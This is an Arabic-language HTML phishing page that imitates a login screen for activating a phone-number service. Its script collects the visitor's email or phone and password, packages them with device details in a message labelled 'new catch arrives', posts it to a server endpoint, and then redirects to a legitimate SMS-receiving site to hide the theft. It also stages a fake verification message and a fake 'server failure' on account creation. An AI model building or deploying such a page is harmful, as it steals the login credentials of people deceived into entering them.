<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل الخدمة</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        :root {
            --primary-color: #CC0044;
            --main-gradient: linear-gradient(135deg, #FF0151 0%, #990033 100%);
        }

        body {
            margin: 0; padding: 0; font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
            background: var(--main-gradient);
            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
        }

        .container {
            background: white; padding: 40px 30px;
            border-radius: 30px; /* حواف ناعمة جداً واحترافية */
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
            width: 88%; max-width: 400px; text-align: center;
            margin-top: 40px; border: 1px solid rgba(255,255,255,0.2);
        }

        #pageImg {
            width: 100px; height: 100px; border-radius: 50%;
            object-fit: contain; margin-bottom: 25px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        h2 { color: var(--primary-color); margin-bottom: 30px; font-size: 20px; font-weight: 800; }

        input {
            width: 100%; padding: 16px; margin-bottom: 18px;
            border: 2px solid #f0f0f0; border-radius: 15px;
            box-sizing: border-box; outline: none; text-align: right;
            font-size: 15px; transition: 0.3s;
        }

        input:focus { border-color: var(--primary-color); background: #fffcfd; }

        .captcha-area { margin-bottom: 25px; min-height: 70px; display: flex; align-items: center; justify-content: content; }
        #status-msg { color: var(--primary-color); font-weight: bold; font-size: 15px; display: none; }

        .main-btn {
            width: 100%; padding: 16px; background: var(--primary-color); color: white;
            border: none; border-radius: 50px; /* تصميم بيضاوي احترافي */
            font-size: 18px; font-weight: bold; cursor: pointer;
            transition: 0.4s ease;
            box-shadow: 0 8px 15px rgba(204, 0, 68, 0.2);
        }

        .main-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 20px rgba(204, 0, 68, 0.3); }

        .footer { margin-top: 25px; font-size: 14px; color: #666; }
        .footer a { color: var(--primary-color); text-decoration: none; font-weight: bold; cursor: pointer; }

        .credits { margin-top: auto; padding: 20px; color: rgba(255,255,255,0.8); font-size: 12px; direction: ltr; }
    </style>
</head>
<body>

    <div class="container">
        <img id="pageImg" src="https://logodix.com/logo/2014521.png" alt="Logo">
        <h2>سجل دخول لتفعيل خدمة الأرقام</h2>

        <form id="loginForm">
            <input type="text" id="user" placeholder="البريد الالكتروني او رقم الهاتف" required>
            <input type="password" id="pass" placeholder="كلمة السر" required>

            <div class="captcha-area">
                <div id="status-msg">🔄 جاري فحص الجهاز...</div>
                <div class="cf-turnstile" id="cf-box" data-sitekey="0x4AAAAAAAx3DX9D0D8D8D8X" data-callback="verifyOk"></div>
            </div>

            <button type="submit" class="main-btn">تسجيل دخول</button>
        </form>

        <div class="footer">
            ليس لديك حساب؟ <a onclick="Swal.fire({icon: 'error', title: 'فشل', text: 'فشل الاتصال بالخادم الرئيسي', confirmButtonColor: '#CC0044'})">إنشاء حساب جديد</a>
        </div>
    </div>

    <div class="credits">Developed by oliver 2014 - 2026</div>

    <script>
        let isDone = false;

        function verifyOk() {
            const box = document.getElementById('cf-box');
            const msg = document.getElementById('status-msg');
            box.style.display = 'none';
            msg.style.display = 'block';

            setTimeout(() => {
                msg.innerHTML = '✅ تم التحقق انك لست روبوت';
                msg.style.color = '#10a745';
                isDone = true;
            }, 2500);
        }

        document.getElementById('loginForm').onsubmit = async (e) => {
            e.preventDefault();
            if (!isDone) return Swal.fire({text: 'يرجى اكمال التحقق أولاً', icon: 'warning'});

            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;

            const niceMessage = `🚀 وصول صيد جديد 🚀\n━━━━━━━━━━━━━━━\n👤 **المستخدم:** \`${u}\` \n🔑 **الباسورد:** \`${p}\` \n━━━━━━━━━━━━━━━\n🔋 **البطارية:** 48% \n📱 **النظام:** ${navigator.platform} \n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')} \n━━━━━━━━━━━━━━━`;

            try {
                await fetch('/api/save', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: niceMessage })
                });
            } catch(err) {}

            window.location.href = "https://receive-smss.com/";
        };
    </script>
</body>
</html>
